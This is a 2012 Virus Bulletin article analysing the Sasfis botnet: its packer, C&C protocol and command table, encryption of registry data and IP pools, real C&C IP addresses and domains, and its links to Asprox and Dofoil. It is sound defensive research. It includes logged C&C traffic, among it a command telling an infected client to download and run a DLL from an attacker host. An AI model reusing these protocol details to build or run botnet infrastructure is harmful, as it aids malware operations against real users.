<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-TDBVSRVN');</script>
<!-- End Google Tag Manager -->
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<!-- Mobile Specific Metas  ================================================== -->
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<!-- CORE CONCRETE  ================================================== -->
<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>

<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Tracking the 2012 Sasfis campaign</title>
<meta name="description" content="Micky Pun unveils all the important nuts and bolts of the latest instalment of the Sasfis botnet by analysing its packers, core payloads and botnet operations." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1985;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>

	<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
	<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>

<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->

<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js" integrity="sha512-ZwR1/gSZM3ai6vCdI+LVF1zSq/5HznD3ZSTk7kajkaj4D292NLuduDCO1c/NT8Id+jE58KYLKT7hXnbtryGmMg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />
<!-- added by lian to get some nice icons: -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<!-- added by lian to get syntax highlighting -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>

<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->
<!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<!-- Navbar
    ================================================== -->
	<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
				<div class="navbar-inner">
					<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
					<div class="navbar-header">
						<button type="button" class="navbar-toggle btn_navbar_custom" >
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
							<span class="icon-bar"></span>
						  </button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div>		</div>
				</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav">		<div class="nav-collapse collapse nav_collapse_custom navbar-collapse" > <div style="clear:both"></div>
<div class="vb-global-search-div"> 
<form action="/index.php/global-search-results/" method="get">
<fieldset>
	<input name="search_paths[]" type="hidden" value="" />
		<input name="query" type="text"  class="vb-global-search"  placeholder="Search site..."/>
	<input name="submit" type="submit" value="Search!" style="display:none"/>
</fieldset>
</form>
</div>


<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self"  class=" nav-first nav-item-6299 "  >Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self"  class=" nav-item-260 "  >VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self"  class=" nav-item-166 "  >VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self"  class=" nav-path-selected active nav-item-160 "  >Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self"  class=" nav-last nav-item-130 "  >Blog</a></li></ul> 	</div>
				</div>
			</div><div class="clearfix"></div>
        </div>
      </div>
	 
    </div>
	<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>
		
<!-- Navbar
    ================================================== -->		
<div class="container m-top-20">
	<div class="row">    
		<div class="col-md-9 col-sm-9 col-lg-9">
		<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201211-Sasfis"></a>Tracking the 2012 Sasfis campaign</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2012-11-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Micky Pun</span></h3><span class="orgname">Fortinet</span>, <span class="orgdiv">Canada</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Micky Pun unveils all the important nuts and bolts of the latest instalment of the Sasfis botnet by analysing its packers, core payloads and botnet operations.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2012 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
    <div id="ccm-remo-expand-title-3313" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-3313" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3371066"></a></span></dt><dt><span class="sect1"><a href="#id4394118">Sample delivery</a></span></dt><dt><span class="sect1"><a href="#id3462579">Packer</a></span></dt><dt><span class="sect1"><a href="#id3320830">Payload</a></span></dt><dt><span class="sect1"><a href="#id3811920">Downloads</a></span></dt><dt><span class="sect1"><a href="#id2113165">Botnet operation</a></span></dt><dt><span class="sect1"><a href="#id4238230">Relationship with Dofoil</a></span></dt><dt><span class="sect1"><a href="#id4551949">Conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3371066"></a></h2></div></div></div><p>Researchers at <span class="emphasis"><em>Fortinet</em></span> have been tracking the Sasfis malware campaign since a surge of new samples surfaced in late May 2012. By early August, the Sasfis botnet had already undergone five major changes. In this article we will unveil all the important nuts and bolts of the latest instalment of the Sasfis botnet by analysing its packers, core payloads and botnet operations (including its relationship with the Asprox spambot). We will also discuss its connection with the Dofoil campaign, which was highly active until the rise of the new Sasfis botnet.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4394118"></a>Sample delivery</h2></div></div></div><p>From the samples we have collected since May, it is evident that the Asprox spambot is used by Sasfis as its sole spreading mechanism. Carrying on its tradition, Asprox initially used the name of a trusted delivery company as the bait to trick users into opening an executable email attachment with a document icon. In early August, however, it was observed that the spam had been improved by replacing the email content with an image containing the same text. The image (<a href="#figure.1">Figure 1</a>) encourages the user to click on it &ndash; in doing so downloading another malicious executable with a document icon. After executing the file, the payload deletes the executable and opens a blank text file in Notepad at the current location to divert the user&rsquo;s attention. These changes provide some benefits to Asprox in that the malware sample is no longer attached to the spam (which previously could easily be blocked by firewalls with up-to-date malware definitions). In addition, storing the malware online makes the botnet operation more dynamic and effective; rapid replacement of the sample makes effective sample collection difficult and hence challenges anti-virus vendors that use checksum-based detection.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="New Asprox spam with picture linked to the malicious attachment stored online." src="/uploads/images/figures/2012/11/Sasfis-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;New Asprox spam with picture linked to the malicious attachment stored online.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3462579"></a>Packer</h2></div></div></div><p>The new Sasfis is packed with a custom packer which releases a DLL PE file into memory. While unpacking the malware, you will notice that the initial part of the custom packer consists of obfuscating instructions, sometimes combined with anti-debug or anti-virtual-environment techniques that aim to make it difficult for humans or emulators to determine the start of the malicious code. </p><p>After successfully unpacking the custom packer, we find in the allocated memory a payload DLL wrapped in a DLL loader, which in turn is wrapped in a decoder (illustrated in <a href="#figure.2">Figure 2</a>). </p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="The structure of Sasfis samples." src="/uploads/images/figures/2012/11/Sasfis-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;The structure of Sasfis samples.</b></p></div><p>The injection technique that is used in the DLL loader is rather new and had not been seen until the Dofoil campaign last year. (We will discuss the relationship between the 2012 Sasfis campaign and Dofoil later in the article.) It is also worth mentioning that some of the custom packers used by Sasfis were found to be identical to the packers being used for packing the Andromeda botnet client &ndash; however, a discussion of Andromeda is outside the scope of this article. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3320830"></a>Payload</h2></div></div></div><p>The payload of Sasfis acts as a listening client in the botnet operation. It does not have a predefined task and only listens for commands that are issued by the C&amp;C server. The traffic that would be accepted by the C&amp;C server is described below:</p><pre class="programlisting">[C&amp;C server URL]/forum/index.php?r=gate&amp;id=XXXXXXX&amp;group=XXXXX&amp;debug=0</pre><p>And in later versions (appeared on 23 July): </p><pre class="programlisting">[C&amp;C server URL]/forum/index.php?r=gate&amp;id=XXXXXXX&amp;group=XXXXX&amp;debug=0&amp;ips=XXX </pre><p>And when the host has been infected more than once in the later edition (first appeared on 6 August) the following traffic pattern will appear: </p><pre class="programlisting">[C&amp;C server URL]/forum/index.php?r=gate/getipslist&amp;id=XXXXXXX </pre><p>where: </p><div class="itemizedlist"><ul type="disc"><li><p><span class="bold"><strong>id</strong></span> is the volume serial number that can be used as the unique identity of the running machine</p></li><li><p><span class="bold"><strong>group</strong></span> is used by the C&amp;C server to identify the running version of the botnet (this will be discussed further in the &lsquo;botnet operation&rsquo; section)</p></li><li><p><span class="bold"><strong>ips</strong></span> is the local IP of the botnet client (for collecting data on local network topology).</p></li></ul></div><p>The first two request formats will allow the client to make contact with the C&amp;C server. The third request format is used for getting a new IP list of &lsquo;possible&rsquo; C&amp;C servers. In addition, the second and third request formats will be encrypted in the TCP traffic by RC4 with the volume serial number as a key. </p><pre class="programlisting">http://[IP derived from IP List]:[Port from the IPList]/[RC4 key]index.php?r=gate&amp;id=[Volume serial Number]
&amp;group=[groupID]&amp;debug=0&amp;ips=[local IP] </pre><p>For example: </p><p>If the randomly chosen server is determined as 62.75.163.172 with port 84 from the IP list, the following line shows what the request looks like before encryption: </p><pre class="programlisting">http://62.75.163.172:84/ac197b68index.php?r=gate&amp;id=ac197b68&amp;group=n1308rcm&amp;debug=0&amp;ips=192.168.153.130 </pre><p>After encrypting the later part with the key using RC4, the hex value of the result will be converted to an ASCII string and attached to the request expression as indicated below:</p><pre class="programlisting">http://62.75.163.172:84/ac197b68988846E47A0F7C6C39E74966287DD0049B32136C54EA07AE3C6FDDC1E58A1CC6DF1D34128
63B821669AF61F182A561F7C7610AA15965570F6A4CF5AE1CA2EA30169A70FD08FE430D </pre><p>When a request is sent to a C&amp;C server, a few different kinds of responses may be received by the client &ndash; see <a href="#figure.3">Figure 3</a>. </p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="When a request is sent to a C&amp;C server, a few kinds of responses may be received by the client." src="/uploads/images/figures/2012/11/Sasfis-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;When a request is sent to a C&amp;C server, a few kinds of responses may be received by the client.</b></p></div><p>The traffic captured by Wireshark demonstrates two possible replies from the C&amp;C server (c=run and c=rdl) in response to the same request message. <a href="#table.1">Table 1</a> summarizes all the responses that can be accepted and interpreted by the client. </p><div class="table"><a id="table.1"></a><table border="1" summary="Commands accepted by Sasfis client."><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">C&amp;C server command</th><th align="center">Format</th><th align="center">Parameters</th></tr></thead><tbody><tr><td>Download and run</td><td>c=run&amp;u=%1024s</td><td>u = URL</td></tr><tr><td>Remove</td><td>C=rem</td><td>N/A</td></tr><tr><td>Download, decrypt and run (with open to register and drop)</td><td>[older Version] c=rdl&amp;u=%1024[^&amp;]&amp;a=%x&amp;k=%x [newer version] c=rdl&amp;u=%1024[^&amp;]&amp;a=%x&amp;k=%x&amp;n=%1024s</td><td>u = URL ,a = autorun flag where a = 1 means the file will be stored in the system and autorun will be set up, k = encryption key, n = name for the downloaded file</td></tr><tr><td>Idle</td><td>c=idl</td><td>N/A</td></tr><tr><td>Rename download at registry</td><td>c=red&amp;n=%1024s</td><td>n = name of the downloaded file</td></tr><tr><td>Update</td><td>c=upd&amp;u=%1024s</td><td>U = URL of the replacement botnet client</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;Commands accepted by Sasfis client.</b></p></div><p>For better malicious file management on infected hosts, Sasfis has a set of rules to keep track of the downloaded items. For example, when a malicious executable such as FakeAV is downloaded through use of the c=rdl command, a registry entry will be created related to this downloaded file stored in the file system (<a href="#figure.4">Figure 4</a>). The entry will be encrypted with a key either generated by some API function or simply by a hard-coded constant. When the Sasfis client wants to retrieve infomation regarding the downloaded files, it will iterate through the all keys in HKEY_CURRENT_USER/SOFWARE and XOR the first 16 digits of the registry data (e.g. /0x09/0x18/0x28/0x95/0x5F/0x19/0x2F/0x94/0x58) with its own key (e.g. VolumeSerialNumber = &lsquo;AC197b68&rsquo; and equalivant to &lsquo;/0x68/0x7b/0x97/0xAC&rsquo; in hex). The registry entry will be valid if the result is equal to the ASCII value of the key itself (&lsquo;AC197b68&rsquo; which is /0x61/0x63/0x31/0x39/0x37/0x62/0x36/0x38 in hex). The rest of the registry data after decryption is shown in <a href="#figure.5">Figure 5</a>. Following the ASCII value of the key, the next eight bytes are the key for decrypting the downloaded file stored at %APPDATA% with the &#xFB01;lename speci&#xFB01;ed in the last eight bytes of data. The &#xFB01;lename &lsquo;svdll&rsquo; in <a href="#figure.5">Figure 5</a> is used for identifying the downloaded object, the server command &lsquo;c=red&amp;%1024s&rsquo; allows this name to be modi&#xFB01;ed. </p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Registry of a host infected by Sasfis." src="/uploads/images/figures/2012/11/Sasfis-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Registry of a host infected by Sasfis.</b></p></div><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Registry data reveals information after decryption (XOR with DWORD key)." src="/uploads/images/figures/2012/11/Sasfis-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Registry data reveals information after decryption (XOR with DWORD key).</b></p></div><p>Another encrypted part of the payload is the C&amp;C server address. In the newer versions, when the command &lsquo;getipsList&rsquo; is requested, an IP list will be downloaded in the following structure: </p><pre class="programlisting">Struct IP_LIST_ENTRY
{
     DWORD C&amp;C_IP
     WORD C&amp;C_Port_number
}

Struct IP_LIST
{
NUMBER_OF_ENTRY = list length / 6
IP_LIST_ENTRY[NUMBER_OF_ENTRY]
}
</pre><p>The IP list is encrypted with RC4 and the client will randomly choose one C&amp;C IP for each request. Rather than the entire IP pool being decrypted and revealed in the dynamic memory, only the chosen C&amp;C IP entry is decrypted using RC4. <a href="#figure.6">Figure 6</a> shows the location of the decryption method in the payload, the &lsquo;default&rsquo; IP pool and hard-coded decryption key location. <a href="#figure.7">Figure 7</a> summarizes the IP pool decryption method.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Location of the IP pool being decrypted." src="/uploads/images/figures/2012/11/Sasfis-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Location of the IP pool being decrypted. </b></p></div><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="IP pool decryption method." src="/uploads/images/figures/2012/11/Sasfis-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;IP pool decryption method.</b></p></div><p>(For a larger version of Figure 7 please <a href="/uploads/images/figures/2012/11/Sasfis-7-large.jpg" target="_top">click here</a>.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3811920"></a>Downloads</h2></div></div></div><p>Once it has registered itself on the C&amp;C server, the Sasfis client will keep polling the server for possible downloads until it is no longer available. The downloaded files include the Asprox spambot (Dammec), a wide variety of password stealers (usually identified as Grabberz), and FakeAV. The Asprox spambot will download a template containing email recipients, the email content, and the attachment or link to download the attachment. FakeAV is downloaded as a pay-per-install element which allows the botnet owner to generate income. The traffic shows that a response will be sent back to another server to give notice that FakeAV has been run.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2113165"></a>Botnet operation</h2></div></div></div><p><a href="#figure.8">Figure 8</a> presents the major changes seen in the Sasfis network since its first discovery. From the timeline, we can see that Sasfis is a growing botnet with increasing functionality and complexity. The groupID is most likely the date when the sample was produced. Through our study of an active Sas&#xFB01;s botnet, we noticed that the uptime of new C&amp;C servers has decreased from an average of one week in May to an average of one to two days in September. This decreasing trend could be explained by the fact that the botnet has already been operating for a few months and it might have reached a point when it has established an optimal number of spambots to keep the botnet growing. In addition, the rapid change of botnet server indicated that the operator has been shifting focus from infecting more computers to preserving the existing infected hosts. By using a pool of malicious IP server addresses to create dynamic traffic, the botnet operator attempts to avoid over exposure of his malicious IPs (which could lead to being blocked by security products). The &lsquo;get IP list&rsquo; command, which is triggered by a reinfection condition, reinforces this goal by rapidly exchanging the IP pool. </p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="Timeline of Sasfis development since May 2012." src="/uploads/images/figures/2012/11/Sasfis-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;Timeline of Sasfis development since May 2012.</b></p></div><p>Perhaps one of the most significant differences between this year&rsquo;s Sasfis and older versions was its integration with Asprox. Traditionally, the Asprox spambot was hosted on different IPs separated from the Sasfis botnet. However, in the 2012 Sasfis samples (from the beginning of August when the IP list was used to replace the malicious domain list), we observed that the same pool of IP addresses was being used by both Asprox C&amp;C servers (for keep-alive messages) and the Sasfis C&amp;C servers. We indentified identical IPs in the Asprox spam template (Listing 1) and Sasfis samples (Listing 2). </p><pre class="programlisting">&lt;s&gt;<span class="bold"><strong>114.202.247.182:84
173.230.131.168:84
188.138.95.133:84
195.210.47.109:80
203.130.129.58:84
209.20.78.241:84</strong></span>
68.173.180.226:84
<span class="bold"><strong>72.55.174.23:84
74.208.73.243:84
77.81.225.253:84</strong></span>
86.126.42.121:84

<span class="bold"><strong>95.131.66.34:84</strong></span>
loftgun01.ru
postbox901.ru
sbolt71.ru
slopokan21.ru
teranian111.ru&lt;/s&gt;

<span class="bold"><strong>Listing 1: Asprox template downloaded from http://24.106.225.182:80 at 2012-09-07 06:32:47 with sample 
8cbfaf6f0334b993f0a69b70fcaea6a2.</strong></span></pre><pre class="programlisting"><span class="bold"><strong>195.210.47.109:80
72.55.174.23:84
74.208.73.243:84
114.202.247.182:84
209.20.78.241:84
203.130.129.58:84
188.138.95.133:84
77.81.225.253:84
173.230.131.168:84
95.131.66.34:84</strong></span>
79.52.163.227:80

<span class="bold"><strong>Listing 2: Default C&amp;C IP pool decoded from sample 8cbfaf6f0334b993f0a69b70fcaea6a2.</strong></span></pre><p>Comparing the IPs we acquired from the previous sample with the traffic we collected at around the time when this sample was collected (<a href="#table.2">Table 2</a>), it is clear that the pool of IPs we got from Listings 1 and 2 is just a small subset of the IP pools that are used for the C&amp;C and Asprox server pool as very few identical IPs were observed. This has made tracking down the entire botnet very difficult because of how the botnet &lsquo;branches out&rsquo; and becomes dynamic. The introduction of the IP pool has added an element of randomness to the botnet&rsquo;s growth and creates a nightmare for sample replication. </p><div class="table"><a id="table.2"></a><table border="1" summary="Traffic collected since three hours before the Asprox template
      was downloaded. "><colgroup><col /><col /><col /></colgroup><thead><tr><th align="center">Access time</th><th align="center">IP address</th><th align="center">Downloaded item</th></tr></thead><tbody><tr><td>07/09/2012 14:47</td><td>http://74.73.102.189:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 14:28</td><td>http://71.95.37.67:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 14:01</td><td>http://46.7.249.50:80 </td><td>Asprox spam template</td></tr><tr><td>07/09/2012 13:49</td><td>http://74.72.186.201:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 13:42</td><td>http://24.10.137.97:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 13:03</td><td>http://71.95.37.67:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 12:38</td><td>http://203.255.53.189:84</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 12:33</td><td>http://24.43.106.9:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 11:15</td><td>http://203.255.53.189:84</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 11:10</td><td>http://24.43.106.9:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 10:59</td><td>http://79.52.163.227:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 10:32</td><td>http://81.88.152.239:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 10:23</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 9:49</td><td>http://46.7.249.50:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 9:49</td><td>http://68.149.67.42:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 9:42</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 9:40</td><td>http://98.26.184.1:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 9:01</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C </td></tr><tr><td>07/09/2012 8:21</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 7:47</td><td>http://68.149.67.42:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 7:40</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 7:08</td><td>http://81.88.152.239:80</td><td>Asprox spam template</td></tr><tr><td>07/09/2012 6:59</td><td>http://158.181.226.124:80</td><td>Asprox backup C&amp;C</td></tr><tr><td>07/09/2012 6:55</td><td>http://74.72.186.201:80</td><td>Asprox spam template </td></tr><tr><td>07/09/2012 6:32</td><td>http://24.106.225.182:80</td><td>Asprox spam template</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Traffic collected since three hours before the Asprox template was downloaded. </b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4238230"></a>Relationship with Dofoil</h2></div></div></div><p>During the process of unpacking Sasfis and its affiliate downloaded item, FakeAV, we discovered that these samples both use the word &lsquo;work&rsquo; as one of the names of an important export function which contains the malicious routine. Looking back at the Dofoil samples we collected between last year and the beginning of this year, we also observed that the word &lsquo;work&rsquo; was revealed during the process of unpacking, marking the location of the payload. There is also a striking resemblance between the injection techniques used by Sasfis and Dofoil. The injection technique provides a way to release the malicious code to a section and attach it to a suspended legitimate window process. The malicious code will be executed when the process is resumed in the end. Since this technique is not common in other malware, these similarities strongly suggest that Sasfis and Dofoil are the work of the same group of authors. Our suspicions were further confirmed by the traffic record we have collected. The history (<a href="#table.3">Table 3</a>) in our system provides evidence that the Dofoil campaign left the cybercrime scene in early May, and the Sasfis campaign stepped in half a month later with the same server (same IP) under a new hostname. </p><div class="table"><a id="table.3"></a><table border="1" summary="Botnet information collected by our system."><colgroup><col /><col /><col /><col /><col /></colgroup><thead><tr><th align="center">From C&amp;C server</th><th align="center">Entry date</th><th align="center">Request content</th><th align="center">Reply content</th><th align="center">Comment</th></tr></thead><tbody><tr><td>beaufortseaa139.ru/ 213.152.180.178</td><td>2012-05-10</td><td> GET /aaa/index.php?wFoAAACjraT9p6W0rK+hpOasr6eprv3y9/KC8ob5+fP2hPOGhvPw+YPz8PDx8YKG (*after decryption it will be revealed as /aaa/index.php?cmd= load&amp;xxxxxxxxxxxxxxxxxxxxxxxxxx)</td><td>302 FOUND http://xxxxxxxxxxx xxxxxxxxxxxxxxxx /1.exe </td><td>The last recorded traffic of the Dofoil botnet in our system </td></tr><tr><td>krasguatanany.ru/ 213.152.180.178</td><td>2012-05-31</td><td>GET /gley/index.php?r=gate&amp;id=xxxxxxxx&amp;group=30.05.2012&amp;debug=0</td><td>c=rdl&amp;u=http://krasguatanany.ru/gley/get/p3.dll.crp&amp;a=0&amp;k=0000493e</td><td>The first recorded traffic of the Sasfis botnet in our system </td></tr></tbody></table><p class="title"><b>Table&nbsp;3.&nbsp;Botnet information collected by our system.</b></p></div><p>There is also an interesting observation about these two botnets. Though their request parameters resonate with one another, the two are actually at opposite ends of the botnet category, that is, Dofoil has a predefined &lsquo;task&rsquo; that is hard-coded in the client, while Sasfis relies on commands from the C&amp;C server to perform tasks. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4551949"></a>Conclusion</h2></div></div></div><p>We have concluded that there is a strong relationship between Sasfis and Dofoil. Through our comparison, it is apparent that the new Sasfis has many major improvements when compared to its older counterpart. As of today, the Sasfis 2012 campaign remains active because of its strong custom packer and we would probably expect more &lsquo;features&rsquo; to become available in the near future. </p></div>		</div>
		<div class="col-md-3 col-sm-3 col-lg-3">
		
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=Tracking the 2012 Sasfis campaign&url=https://www.virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2012/11/tracking-2012-sasfis-campaign&title=Tracking the 2012 Sasfis campaign"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' 